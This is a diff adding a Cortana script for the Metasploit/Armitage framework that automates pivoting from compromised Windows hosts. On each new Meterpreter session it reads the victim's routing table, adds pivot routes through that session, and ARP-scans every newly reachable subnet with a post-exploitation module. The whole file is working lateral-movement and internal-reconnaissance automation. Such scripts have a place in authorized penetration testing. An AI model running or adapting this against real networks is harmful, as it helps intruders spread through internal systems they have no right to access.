@@ -1,0 +1,46 @@
+# Cortana script to discover strange new networks.
+
+# Step 1. When a session opens, grab its routes.
+on session_sync {
+	if (-iswinmeterpreter $1) {
+		m_cmd($1, "route");
+	}
+}
+
+# Step 2. filter networks that we don't need to look at.
+sub cleanup {
+	local('$entry $network $netmask');
+	foreach $entry ($1) {
+		($network, $netmask) = values($entry, @('Subnet', 'Netmask'));
+		if (
+			$network eq "0.0.0.0" || $netmask eq "0.0.0.0" || 
+			$network eq "127.0.0.0" || $netmask eq "255.255.255.255" || 
+			$netmask eq "240.0.0.0" || route($network) !is $null ||
+			route_temp($network, $netmask) isroute $2
+		) {
+			remove();
+		}
+	}
+	return $1;
+}
+
+# Step 3. Loop through the routes on the host, setup pivots
+on meterpreter_route {
+	local('@routes $route');
+	@routes = cleanup(parse_route($3), session_host($1));
+	foreach $route (@routes) {
+		route_add($route['Subnet'], $route['Netmask'], $1);
+	}
+}
+
+# Step 4. When a new route appears, ARP scan it.
+on route_add {
+	local('$host $mask $gateway');
+	($host, $mask, $gateway) = values(route_info($1), @('host', 'mask', 'gateway'));
+
+	# convert the mask to something we can use.
+	$mask = strlen(strrep(formatNumber([graph.Route ipToLong: $mask], 10, 2), '0', ''));
+
+	println("[*] Discovered $host $+ / $+ $mask -> $gateway $+ . Scanning");
+	launch("post", "windows/gather/arp_scanner", %(SESSION => $gateway, RHOSTS => "$host $+ / $+ $mask"));
+}
